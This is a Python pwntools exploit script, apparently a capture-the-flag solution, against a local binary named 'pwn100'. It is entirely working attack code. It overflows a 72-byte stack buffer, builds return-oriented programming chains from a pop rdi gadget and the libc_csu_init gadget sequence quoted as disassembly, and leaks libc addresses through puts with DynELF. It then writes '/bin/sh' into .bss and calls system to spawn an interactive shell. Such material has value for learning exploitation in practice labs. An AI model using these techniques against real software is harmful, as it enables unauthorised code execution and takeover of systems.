#!/usr/bin/python
from pwn import *
context.arch = 'amd64'
p = process('./pwn100')
elf = ELF('./pwn100')
g = lambda x: next(elf.search(asm(x)))
puts = elf.plt['puts']
read_got = elf.got['read']
buf = elf.bss(0x20)
pop_rdi_ret = g('pop rdi ; ret')
start = 0x400550

#  400740:       4c 89 ea                mov    rdx,r13
#  400743:       4c 89 f6                mov    rsi,r14
#  400746:       44 89 ff                mov    edi,r15d
#  400749:       41 ff 14 dc             call   QWORD PTR [r12+rbx*8]
#  40074d:       48 83 c3 01             add    rbx,0x1
#  400751:       48 39 eb                cmp    rbx,rbp
#  400754:       75 ea                   jne    400740 <__gmon_start__@plt+0x200>
#  400756:       48 83 c4 08             add    rsp,0x8
#  40075a:       5b                      pop    rbx
#  40075b:       5d                      pop    rbp
#  40075c:       41 5c                   pop    r12
#  40075e:       41 5d                   pop    r13
#  400760:       41 5e                   pop    r14
#  400762:       41 5f                   pop    r15
#  400764:       c3                      ret
def csu(rbx, rbp, r12, r13, r14, r15, ret_addr):
	payload = flat([
		'\x00' * 72, 
		0x40075a, 
		rbx, rbp, r12, r13, r14, r15, 
		0x400740, 
		'\x00' * 56, 
		ret_addr
	])
	payload = payload.ljust(200, '\x00')
	p.send(payload)

def leak(addr):
	count = 0
	up = ''
	data = ''
	payload = flat([
		'\x00' * 72, 
		pop_rdi_ret, 
		addr, 
		puts, 
		start
	])
	payload = payload.ljust(200, '\x00')
	p.send(payload)
	p.recvuntil('bye~\n')
	while True:
		c = p.recv(numb=1, timeout=0.1)
		count += 1
		if up == '\n' and c == '':
			data = data[:-1] + '\x00'
			break
		else:
			data += c
			up = c
	data = data[:4]
	return data

d = DynELF(leak, elf = elf)
system = d.lookup('system', 'libc')
success('system = ' + hex(system))
csu(0, 1, read_got, 8, buf, 0, start)
p.recvuntil('bye~\n')
p.send('/bin/sh\x00')
payload = flat([
	'A' * 72, 
	pop_rdi_ret, 
	buf, 
	system
])
payload = payload.ljust(200, '\x00')
# print repr(payload)
p.send(payload)
p.clean()
p.interactive()
